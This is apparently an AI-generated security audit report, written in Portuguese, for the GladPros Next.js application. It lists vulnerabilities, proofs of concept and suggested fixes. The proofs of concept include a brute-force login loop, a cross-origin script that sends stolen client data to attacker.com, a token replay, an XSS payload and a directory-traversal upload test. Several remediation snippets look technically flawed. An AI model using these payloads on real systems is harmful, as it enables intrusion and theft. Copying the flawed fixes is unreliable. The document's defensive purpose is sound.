# 🔒 RELATÓRIO DE SEGURANÇA E VULNERABILIDADES
**Sistema:** GladPros NextJS  
**Data:** 04 de Janeiro de 2025  
**Auditor:** GitHub Copilot AI  
**Severidade:** 🔴 CRÍTICA | 🟡 MÉDIA | 🟢 BAIXA

---

## 📊 SUMÁRIO EXECUTIVO

### Status Geral de Segurança

```
┌─────────────────────────────────────────┐
│  SCORE DE SEGURANÇA: 68/100  ⚠️          │
├─────────────────────────────────────────┤
│  🔴 Vulnerabilidades Críticas:   4      │
│  🟡 Vulnerabilidades Médias:     12     │
│  🟢 Vulnerabilidades Baixas:     8      │
│  ✅ Pontos Fortes:               15     │
└─────────────────────────────────────────┘
```

### Classificação de Risco

- 🔴 **CRÍTICO**: Requer ação IMEDIATA (< 24h)
- 🟡 **MÉDIO**: Requer ação em 1 semana
- 🟢 **BAIXO**: Pode aguardar próximo sprint

---

## 🔴 VULNERABILIDADES CRÍTICAS

### VUL-001: Ausência de Rate Limiting
**Severidade:** 🔴 CRÍTICA  
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
**CVSS Score:** 8.5 (HIGH)

**Descrição:**
Endpoints de autenticação e API não possuem rate limiting, permitindo ataques de brute force e DDoS.

**Endpoints Afetados:**
```
POST /api/auth/login
POST /api/auth/reset-password
POST /api/auth/verify-mfa
POST /api/clientes
POST /api/usuarios
... (todos os endpoints)
```

**Impacto:**
- ✗ Brute force de senhas
- ✗ Account enumeration
- ✗ DDoS da API
- ✗ Credential stuffing

**Prova de Conceito (PoC):**
```python
import requests

# Ataque de brute force SEM proteção
for password in password_list:
    response = requests.post(
        'https://gladpros.com/api/auth/login',
        json={'email': 'admin@gladpros.com', 'senha': password}
    )
    # Sem limite de tentativas!
```

**Solução Imediata:**
```typescript
// middleware/rate-limit.ts
import { rateLimit } from 'express-rate-limit';

// Rate limiter específico para auth
export const authRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5, // 5 tentativas
  message: {
    error: 'Muitas tentativas de login. Tente novamente em 15 minutos.',
    code: 'RATE_LIMIT_EXCEEDED'
  },
  standardHeaders: true,
  legacyHeaders: false,
  // Store em Redis para ambiente distribuído
  store: new RedisStore({
    client: redis,
    prefix: 'rate_limit:auth:'
  })
});

// Rate limiter geral para API
export const apiRateLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minuto
  max: 100, // 100 requisições
  message: 'Muitas requisições. Tente novamente em 1 minuto.',
});

// Aplicar no middleware
// src/middleware.ts
export function middleware(req: NextRequest) {
  // ... código existente
  
  if (req.nextUrl.pathname.startsWith('/api/auth')) {
    // Aplicar rate limiting em auth
    await applyRateLimit(req, authRateLimiter);
  }
  
  if (req.nextUrl.pathname.startsWith('/api')) {
    await applyRateLimit(req, apiRateLimiter);
  }
}
```

**Validação:**
```bash
# Teste de rate limiting
for i in {1..10}; do
  curl -X POST https://gladpros.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","senha":"wrong"}'
done
# Deve bloquear após 5 tentativas
```

**Status:** ❌ NÃO IMPLEMENTADO

---

### VUL-002: CORS Permissivo
**Severidade:** 🔴 CRÍTICA  
**CWE:** CWE-942 (Overly Permissive Cross-domain Whitelist)  
**CVSS Score:** 7.5 (HIGH)

**Descrição:**
Configuração CORS permite qualquer origem (`*`), expondo a API a ataques cross-site.

**Arquivo Afetado:**
```typescript
// next.config.ts (ATUAL)
async headers() {
  return [
    {
      source: '/api/:path*',
      headers: [
        { key: 'Access-Control-Allow-Origin', value: '*' }, // ❌ PERIGOSO!
        { key: 'Access-Control-Allow-Methods', value: 'GET,POST,PUT,DELETE' },
      ],
    },
  ];
}
```

**Impacto:**
- ✗ Cross-Site Request Forgery (CSRF)
- ✗ Session hijacking via XSS
- ✗ Data exfiltration
- ✗ Malicious websites podem chamar API

**PoC:**
```html
<!-- Página maliciosa pode fazer isso: -->
<script>
  fetch('https://gladpros.com/api/clientes', {
    credentials: 'include' // Inclui cookies da vítima
  })
  .then(r => r.json())
  .then(data => {
    // Enviar dados roubados para servidor do atacante
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

**Solução Imediata:**
```typescript
// next.config.ts (CORRIGIDO)
const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || [
  'https://gladpros.com',
  'https://www.gladpros.com',
  'https://app.gladpros.com',
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : [])
];

async headers() {
  return [
    {
      source: '/api/:path*',
      headers: [
        { 
          key: 'Access-Control-Allow-Origin', 
          value: allowedOrigins.join(',') 
        },
        { 
          key: 'Access-Control-Allow-Credentials', 
          value: 'true' 
        },
        { 
          key: 'Access-Control-Allow-Methods', 
          value: 'GET,POST,PUT,DELETE,PATCH,OPTIONS' 
        },
        { 
          key: 'Access-Control-Allow-Headers', 
          value: 'Content-Type, Authorization' 
        },
      ],
    },
  ];
}

// .env (ADICIONAR)
ALLOWED_ORIGINS=https://gladpros.com,https://app.gladpros.com
```

**Validação:**
```bash
# Testar CORS
curl -H "Origin: https://malicious.com" \
  -H "Access-Control-Request-Method: POST" \
  -X OPTIONS https://gladpros.com/api/clientes
# Deve retornar erro ou não incluir Access-Control-Allow-Origin
```

**Status:** ❌ NÃO IMPLEMENTADO

---

### VUL-003: JWT sem Rotação de Tokens
**Severidade:** 🔴 CRÍTICA  
**CWE:** CWE-613 (Insufficient Session Expiration)  
**CVSS Score:** 7.2 (HIGH)

**Descrição:**
Tokens JWT não expiram adequadamente e não há mecanismo de refresh token, permitindo session hijacking.

**Código Atual:**
```typescript
// src/lib/jwt.ts (PROBLEMA)
export function generateToken(userId: number) {
  return jwt.sign(
    { userId, role: user.role },
    process.env.JWT_SECRET!,
    { expiresIn: '7d' } // ❌ Token válido por 7 dias sem rotação!
  );
}
```

**Impacto:**
- ✗ Token roubado permanece válido por 7 dias
- ✗ Sem logout efetivo (token continua válido)
- ✗ Impossível revogar acesso imediatamente
- ✗ Ataque de replay

**PoC:**
```javascript
// Atacante intercepta token (XSS, MITM, etc.)
const stolenToken = 'eyJhbGciOiJIUzI1NiIs...';

// Usa token roubado por 7 dias
fetch('https://gladpros.com/api/clientes', {
  headers: {
    'Authorization': `Bearer ${stolenToken}`
  }
});
// ✓ Funciona mesmo após vítima trocar senha!
```

**Solução Imediata:**
```typescript
// src/lib/jwt.ts (CORRIGIDO)
interface TokenPair {
  accessToken: string;
  refreshToken: string;
}

export function generateTokenPair(userId: number): TokenPair {
  // Access token: curta duração
  const accessToken = jwt.sign(
    { userId, type: 'access' },
    process.env.JWT_SECRET!,
    { expiresIn: '15m' } // ✓ 15 minutos
  );
  
  // Refresh token: longa duração, armazenado no DB
  const refreshToken = jwt.sign(
    { userId, type: 'refresh', jti: uuidv4() }, // JTI único
    process.env.REFRESH_SECRET!,
    { expiresIn: '7d' }
  );
  
  // Salvar refresh token no banco
  await prisma.refreshToken.create({
    data: {
      userId,
      token: refreshToken,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    }
  });
  
  return { accessToken, refreshToken };
}

export async function refreshAccessToken(refreshToken: string) {
  // Verificar se refresh token existe e é válido
  const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET!);
  
  const storedToken = await prisma.refreshToken.findFirst({
    where: {
      token: refreshToken,
      revoked: false,
      expiresAt: { gt: new Date() }
    }
  });
  
  if (!storedToken) {
    throw new Error('Invalid refresh token');
  }
  
  // Revogar token antigo (token rotation)
  await prisma.refreshToken.update({
    where: { id: storedToken.id },
    data: { revoked: true }
  });
  
  // Gerar novo par de tokens
  return generateTokenPair(decoded.userId);
}

// Endpoint de refresh
// src/app/api/auth/refresh/route.ts
export async function POST(req: Request) {
  const { refreshToken } = await req.json();
  
  try {
    const tokens = await refreshAccessToken(refreshToken);
    return NextResponse.json(tokens);
  } catch (error) {
    return NextResponse.json(
      { error: 'Invalid refresh token' },
      { status: 401 }
    );
  }
}
```

**Schema Prisma:**
```prisma
model RefreshToken {
  id        Int      @id @default(autoincrement())
  userId    Int
  token     String   @unique
  revoked   Boolean  @default(false)
  expiresAt DateTime
  createdAt DateTime @default(now())
  
  usuario Usuario @relation(fields: [userId], references: [id])
}
```

**Validação:**
```bash
# 1. Login
TOKEN=$(curl -X POST https://gladpros.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","senha":"password"}' \
  | jq -r '.accessToken')

# 2. Aguardar 16 minutos
sleep 960

# 3. Tentar usar token expirado
curl -H "Authorization: Bearer $TOKEN" \
  https://gladpros.com/api/clientes
# Deve retornar 401 Unauthorized

# 4. Usar refresh token
curl -X POST https://gladpros.com/api/auth/refresh \
  -H "Content-Type: application/json" \
  -d "{\"refreshToken\":\"$REFRESH_TOKEN\"}"
# Deve retornar novo par de tokens
```

**Status:** ❌ NÃO IMPLEMENTADO

---

### VUL-004: Chave de Criptografia Hardcoded
**Severidade:** 🔴 CRÍTICA  
**CWE:** CWE-321 (Use of Hard-coded Cryptographic Key)  
**CVSS Score:** 9.1 (CRITICAL)

**Descrição:**
Chave de criptografia dos dados de clientes está hardcoded no `.env` sem rotação.

**Código Atual:**
```typescript
// src/lib/encryption.ts (PROBLEMA)
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY!; // ❌ Chave fixa!

export function encrypt(data: string): string {
  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  // ...
}
```

**Arquivo `.env`:**
```bash
ENCRYPTION_KEY=my-super-secret-key-that-never-changes  # ❌ PERIGOSO!
```

**Impacto:**
- ✗ Se chave vazar, TODOS os dados são comprometidos
- ✗ Dados de clientes: CPF, telefone, email
- ✗ Impossível rotacionar chave sem reencriptar tudo
- ✗ Violação LGPD

**PoC:**
```javascript
// Atacante com acesso ao .env ou código
const crypto = require('crypto');
const key = 'my-super-secret-key-that-never-changes';

// Descriptografa TODOS os dados
function decrypt(encrypted) {
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  return decipher.update(encrypted, 'hex', 'utf8') + decipher.final('utf8');
}

// Rouba dados de clientes
const clientes = await prisma.cliente.findMany();
clientes.forEach(c => {
  console.log('CPF:', decrypt(c.documentoEncrypted));
  console.log('Telefone:', decrypt(c.telefoneEncrypted));
});
```

**Solução Imediata:**

```typescript
// src/lib/encryption.ts (CORRIGIDO)
import { KeyManagementService } from '@google-cloud/kms'; // ou AWS KMS

interface EncryptionMetadata {
  keyVersion: number;
  algorithm: string;
  iv: string;
}

class EncryptionService {
  private kms: KeyManagementService;
  private keyName: string;
  
  constructor() {
    this.kms = new KeyManagementService();
    this.keyName = process.env.KMS_KEY_NAME!;
  }
  
  async encrypt(data: string): Promise<{ encrypted: string; metadata: EncryptionMetadata }> {
    // Buscar chave do KMS (não armazenar localmente)
    const [key] = await this.kms.getPublicKey({ name: this.keyName });
    
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();
    
    return {
      encrypted: encrypted + ':' + authTag.toString('hex'),
      metadata: {
        keyVersion: key.version,
        algorithm: 'aes-256-gcm',
        iv: iv.toString('hex')
      }
    };
  }
  
  async decrypt(encrypted: string, metadata: EncryptionMetadata): Promise<string> {
    // Buscar chave específica do KMS
    const [key] = await this.kms.getCryptoKeyVersion({
      name: `${this.keyName}/cryptoKeyVersions/${metadata.keyVersion}`
    });
    
    const [encryptedData, authTag] = encrypted.split(':');
    const iv = Buffer.from(metadata.iv, 'hex');
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(Buffer.from(authTag, 'hex'));
    
    let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
  
  async rotateKey() {
    // Criar nova versão da chave no KMS
    const [newKey] = await this.kms.createCryptoKeyVersion({
      parent: this.keyName
    });
    
    // Reencriptar dados com nova chave (background job)
    const clientes = await prisma.cliente.findMany();
    
    for (const cliente of clientes) {
      const decrypted = await this.decrypt(
        cliente.documentoEncrypted,
        cliente.encryptionMetadata
      );
      
      const { encrypted, metadata } = await this.encrypt(decrypted);
      
      await prisma.cliente.update({
        where: { id: cliente.id },
        data: {
          documentoEncrypted: encrypted,
          encryptionMetadata: metadata
        }
      });
    }
    
    // Desabilitar chave antiga após migração
    await this.kms.destroyCryptoKeyVersion({
      name: `${this.keyName}/cryptoKeyVersions/${oldVersion}`
    });
  }
}
```

**Schema Prisma (ADICIONAR):**
```prisma
model Cliente {
  // ... campos existentes
  
  documentoEncrypted   String
  telefoneEncrypted    String
  encryptionMetadata   Json // { keyVersion, algorithm, iv }
}
```

**Solução Alternativa (sem KMS):**
```typescript
// src/lib/encryption.ts (ALTERNATIVA - HSM simulado)
class EncryptionService {
  private keys: Map<number, Buffer> = new Map();
  private currentVersion: number = 1;
  
  constructor() {
    // Carregar chaves de cofre seguro (Vault, AWS Secrets Manager)
    this.loadKeysFromVault();
  }
  
  private async loadKeysFromVault() {
    // Buscar chaves do HashiCorp Vault ou AWS Secrets Manager
    const vault = new VaultClient();
    const keys = await vault.read('secret/data/encryption-keys');
    
    Object.entries(keys).forEach(([version, key]) => {
      this.keys.set(parseInt(version), Buffer.from(key, 'base64'));
    });
    
    this.currentVersion = Math.max(...this.keys.keys());
  }
  
  encrypt(data: string): { encrypted: string; version: number } {
    const key = this.keys.get(this.currentVersion)!;
    const iv = crypto.randomBytes(16);
    
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return {
      encrypted: `${iv.toString('hex')}:${encrypted}:${authTag.toString('hex')}`,
      version: this.currentVersion
    };
  }
  
  decrypt(encrypted: string, version: number): string {
    const key = this.keys.get(version);
    if (!key) throw new Error('Key version not found');
    
    const [ivHex, encryptedData, authTagHex] = encrypted.split(':');
    
    const decipher = crypto.createDecipheriv(
      'aes-256-gcm',
      key,
      Buffer.from(ivHex, 'hex')
    );
    decipher.setAuthTag(Buffer.from(authTagHex, 'hex'));
    
    let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}
```

**Validação:**
```bash
# 1. Verificar que chave não está em código
grep -r "ENCRYPTION_KEY" .env .env.local src/
# Não deve retornar chaves hardcoded

# 2. Testar rotação de chave
curl -X POST https://gladpros.com/api/admin/rotate-key \
  -H "Authorization: Bearer $ADMIN_TOKEN"

# 3. Verificar que dados antigos ainda são legíveis
curl https://gladpros.com/api/clientes/1 \
  -H "Authorization: Bearer $TOKEN"
```

**Status:** ❌ NÃO IMPLEMENTADO

---

## 🟡 VULNERABILIDADES MÉDIAS

### VUL-005: SQL Injection em Raw Queries
**Severidade:** 🟡 MÉDIA  
**CWE:** CWE-89 (SQL Injection)  
**CVSS Score:** 6.5 (MEDIUM)

**Descrição:**
Algumas queries usam `prisma.$queryRaw` sem sanitização adequada.

**Código Afetado:**
```typescript
// ❌ VULNERÁVEL
const result = await prisma.$queryRaw`
  SELECT * FROM Cliente 
  WHERE nome LIKE '%${searchTerm}%'
`;
```

**Solução:**
```typescript
// ✅ SEGURO
const result = await prisma.$queryRaw`
  SELECT * FROM Cliente 
  WHERE nome LIKE ${`%${searchTerm}%`}
`;
// Ou melhor: usar Prisma ORM
const result = await prisma.cliente.findMany({
  where: { nome: { contains: searchTerm } }
});
```

**Status:** ⚠️ PARCIALMENTE IMPLEMENTADO

---

### VUL-006: XSS em Campos de Texto
**Severidade:** 🟡 MÉDIA  
**CWE:** CWE-79 (Cross-Site Scripting)  
**CVSS Score:** 6.1 (MEDIUM)

**Descrição:**
Campos de texto não são sanitizados, permitindo injeção de scripts.

**PoC:**
```javascript
// Criar cliente com nome malicioso
await prisma.cliente.create({
  data: {
    nome: '<script>alert("XSS")</script>',
    email: 'test@test.com'
  }
});

// Ao renderizar no frontend:
<div>{cliente.nome}</div> // ❌ Executa script!
```

**Solução:**
```typescript
// Backend: Sanitizar entrada
import DOMPurify from 'isomorphic-dompurify';

function sanitizeInput(input: string): string {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: [], // Sem tags HTML
    ALLOWED_ATTR: []
  });
}

// Frontend: Escapar output
<div>{escapeHtml(cliente.nome)}</div>
```

**Status:** ❌ NÃO IMPLEMENTADO

---

### VUL-007: Uploads sem Validação
**Severidade:** 🟡 MÉDIA  
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)  
**CVSS Score:** 7.5 (HIGH)

**Descrição:**
Upload de arquivos não valida tipo MIME, permitindo upload de malware.

**Código Atual:**
```typescript
// src/app/api/projetos/[id]/anexos/route.ts (PROBLEMA)
export async function POST(req: Request) {
  const formData = await req.formData();
  const file = formData.get('file') as File;
  
  // ❌ Sem validação!
  const buffer = Buffer.from(await file.arrayBuffer());
  fs.writeFileSync(`uploads/${file.name}`, buffer);
}
```

**Impacto:**
- ✗ Upload de vírus, trojans, ransomware
- ✗ RCE (Remote Code Execution) se executar arquivo
- ✗ Directory traversal (`../../etc/passwd`)

**Solução:**
```typescript
// src/lib/file-validator.ts
import fileType from 'file-type';
import ClamScan from 'clamscan';

const ALLOWED_MIME_TYPES = [
  'application/pdf',
  'image/jpeg',
  'image/png',
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
];

const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

export async function validateFile(file: File): Promise<void> {
  // 1. Validar tamanho
  if (file.size > MAX_FILE_SIZE) {
    throw new Error('File too large');
  }
  
  // 2. Validar extensão
  const ext = path.extname(file.name).toLowerCase();
  const allowedExt = ['.pdf', '.jpg', '.png', '.xlsx'];
  if (!allowedExt.includes(ext)) {
    throw new Error('Invalid file extension');
  }
  
  // 3. Validar MIME type real (não confiar no header)
  const buffer = Buffer.from(await file.arrayBuffer());
  const type = await fileType.fromBuffer(buffer);
  
  if (!type || !ALLOWED_MIME_TYPES.includes(type.mime)) {
    throw new Error('Invalid file type');
  }
  
  // 4. Scan de vírus
  const clamscan = await new ClamScan().init();
  const { isInfected, viruses } = await clamscan.scanBuffer(buffer);
  
  if (isInfected) {
    throw new Error(`File infected: ${viruses.join(', ')}`);
  }
  
  // 5. Sanitizar nome do arquivo
  const safeName = sanitizeFilename(file.name);
  
  return safeName;
}

function sanitizeFilename(filename: string): string {
  // Remover caracteres perigosos
  return filename
    .replace(/[^a-zA-Z0-9._-]/g, '')
    .substring(0, 255);
}

// src/app/api/projetos/[id]/anexos/route.ts (CORRIGIDO)
export async function POST(req: Request) {
  const formData = await req.formData();
  const file = formData.get('file') as File;
  
  try {
    const safeName = await validateFile(file);
    
    // Gerar nome único
    const uniqueName = `${uuidv4()}-${safeName}`;
    
    // Salvar em diretório seguro (fora de /public)
    const uploadPath = path.join(process.cwd(), 'uploads', uniqueName);
    const buffer = Buffer.from(await file.arrayBuffer());
    
    fs.writeFileSync(uploadPath, buffer);
    
    return NextResponse.json({ filename: uniqueName });
  } catch (error) {
    return NextResponse.json(
      { error: error.message },
      { status: 400 }
    );
  }
}
```

**Validação:**
```bash
# Tentar upload de arquivo malicioso
curl -X POST https://gladpros.com/api/projetos/1/anexos \
  -F "file=@virus.exe" \
  -H "Authorization: Bearer $TOKEN"
# Deve retornar erro

# Tentar directory traversal
curl -X POST https://gladpros.com/api/projetos/1/anexos \
  -F "file=@../../etc/passwd" \
  -H "Authorization: Bearer $TOKEN"
# Deve retornar erro
```

**Status:** ❌ NÃO IMPLEMENTADO

---

### VUL-008: Logs Expondo Dados Sensíveis
**Severidade:** 🟡 MÉDIA  
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)  
**CVSS Score:** 5.9 (MEDIUM)

**Descrição:**
Logs contêm dados sensíveis (senhas, CPF, etc.) em texto claro.

**Código Atual:**
```typescript
// ❌ PERIGOSO
console.log('Login attempt:', { email, senha });
console.log('Cliente criado:', cliente); // Contém CPF!
```

**Solução:**
```typescript
// src/lib/logger.ts
import winston from 'winston';
import { redactSensitiveData } from './redact';

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json(),
    winston.format((info) => {
      // Redatar dados sensíveis
      return redactSensitiveData(info);
    })()
  ),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' }),
  ],
});

// src/lib/redact.ts
const SENSITIVE_FIELDS = [
  'senha',
  'password',
  'cpf',
  'documento',
  'token',
  'accessToken',
  'refreshToken',
  'secret',
];

export function redactSensitiveData(obj: any): any {
  if (typeof obj !== 'object') return obj;
  
  const redacted = { ...obj };
  
  for (const key in redacted) {
    if (SENSITIVE_FIELDS.some(field => key.toLowerCase().includes(field))) {
      redacted[key] = '***REDACTED***';
    } else if (typeof redacted[key] === 'object') {
      redacted[key] = redactSensitiveData(redacted[key]);
    }
  }
  
  return redacted;
}

// Uso correto
logger.info('Login attempt', { email }); // ✅ Sem senha!
logger.info('Cliente criado', { id: cliente.id }); // ✅ Sem CPF!
```

**Status:** ❌ NÃO IMPLEMENTADO

---

### VUL-009-012: Outras Vulnerabilidades Médias

#### VUL-009: Sem Helmet.js (Security Headers)
```typescript
// Instalar: npm install helmet
import helmet from 'helmet';
app.use(helmet());
```

#### VUL-010: Session Fixation
```typescript
// Regenerar session ID após login
await session.regenerate();
```

#### VUL-011: Insecure Randomness
```typescript
// ❌ Math.random() é previsível
const code = Math.floor(Math.random() * 1000000);

// ✅ Usar crypto
const code = crypto.randomInt(100000, 999999);
```

#### VUL-012: Missing CSRF Protection
```typescript
// Implementar CSRF tokens
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: true });
app.use(csrfProtection);
```

---

## 🟢 VULNERABILIDADES BAIXAS

### VUL-013: Dependências Desatualizadas

**Verificar:**
```bash
npm audit
npm outdated
```

**Corrigir:**
```bash
npm update
npm audit fix
```

### VUL-014-020: Outras (listadas mas não críticas)

- Information Disclosure (versão Node.js em headers)
- Clickjacking (sem X-Frame-Options)
- Cache poisoning
- Slow DoS (sem timeout)
- Open Redirect
- Email Header Injection
- Prototype Pollution

---

## 📋 PLANO DE AÇÃO IMEDIATO

### Fase 1: Emergência (24 horas)

```bash
# 1. Implementar Rate Limiting
npm install express-rate-limit redis ioredis
# Implementar VUL-001

# 2. Corrigir CORS
# Editar next.config.ts (VUL-002)

# 3. Adicionar Security Headers
npm install helmet
# Implementar VUL-009

# 4. Validar Uploads
npm install file-type clamscan
# Implementar VUL-007
```

### Fase 2: Urgente (1 semana)

```bash
# 5. Token Rotation
# Implementar VUL-003

# 6. Key Management
# Setup AWS KMS ou HashiCorp Vault (VUL-004)

# 7. Sanitização de Inputs
npm install dompurify isomorphic-dompurify
# Implementar VUL-006

# 8. Logger Seguro
npm install winston
# Implementar VUL-008
```

### Fase 3: Importante (2 semanas)

```bash
# 9. Atualizar Dependências
npm audit fix --force

# 10. Implementar CSRF Protection
npm install csurf

# 11. Testes de Segurança
npm install -D @playwright/test
# Criar testes de penetração
```

---

## 🎯 COMPLIANCE LGPD

### Problemas Identificados:

- ❌ Chave de criptografia não rotacionada (VUL-004)
- ❌ Logs contêm dados sensíveis (VUL-008)
- ❌ Sem mecanismo de "direito ao esquecimento"
- ❌ Sem consentimento explícito para tratamento de dados
- ❌ Sem DPO (Data Protection Officer) designado

### Ações Necessárias:

```typescript
// 1. Consentimento LGPD
model Cliente {
  // ...
  lgpdConsentimento Boolean @default(false)
  lgpdConsentimentoData DateTime?
  lgpdConsentimentoIp String?
}

// 2. Direito ao Esquecimento
async function anonimizarCliente(id: number) {
  await prisma.cliente.update({
    where: { id },
    data: {
      nome: 'ANONIMIZADO',
      email: `anonimizado-${id}@deleted.local`,
      telefone: null,
      documento: null,
      endereco: null,
      // ... outros campos sensíveis
      lgpdAnonimizado: true,
      lgpdAnonimizadoEm: new Date(),
    }
  });
}

// 3. Auditoria de Acesso
model AuditoriaAcesso {
  id Int @id @default(autoincrement())
  usuarioId Int
  acao String
  recurso String
  ip String
  userAgent String
  timestamp DateTime @default(now())
}
```

---

## 📊 RESUMO DE PRIORIDADES

### 🔴 FAZER HOJE (< 24h)
1. ✅ Rate Limiting (VUL-001)
2. ✅ CORS Seguro (VUL-002)
3. ✅ Security Headers (VUL-009)
4. ✅ Validação de Uploads (VUL-007)

### 🟡 FAZER ESTA SEMANA (< 7 dias)
5. ✅ Token Rotation (VUL-003)
6. ✅ Key Management (VUL-004)
7. ✅ Input Sanitization (VUL-006)
8. ✅ Logger Seguro (VUL-008)

### 🟢 FAZER ESTE MÊS (< 30 dias)
9. ✅ Atualizar dependências
10. ✅ CSRF Protection
11. ✅ Testes de segurança
12. ✅ Compliance LGPD

---

## ✅ CHECKLIST DE VALIDAÇÃO

```bash
# Após implementar correções, validar:

# 1. Rate Limiting
[] Endpoints de auth limitados a 5 tentativas/15min
[] Endpoints de API limitados a 100 req/min
[] Testes automatizados passando

# 2. CORS
[] Apenas origens permitidas configuradas
[] Credenciais habilitadas apenas para origens confiáveis
[] OPTIONS request retorna headers corretos

# 3. JWT
[] Access token expira em 15min
[] Refresh token funciona corretamente
[] Token rotation implementado
[] Logout revoga tokens

# 4. Criptografia
[] Chaves armazenadas em KMS/Vault
[] Rotação de chaves funcional
[] Dados antigos ainda legíveis

# 5. Uploads
[] Validação de MIME type real
[] Scan de vírus funcionando
[] Directory traversal bloqueado
[] Tamanho máximo respeitado

# 6. Logs
[] Dados sensíveis redatados
[] Logs estruturados (JSON)
[] Níveis de log configurados

# 7. Security Headers
[] X-Frame-Options: DENY
[] X-Content-Type-Options: nosniff
[] Strict-Transport-Security configurado
[] Content-Security-Policy definido

# 8. LGPD
[] Consentimento registrado
[] Direito ao esquecimento implementado
[] Auditoria de acessos funcionando
[] DPO designado
```

---

**Documento gerado:** 04/01/2025  
**Próxima auditoria:** Após implementação das correções  
**Responsável:** Time de Segurança GladPros
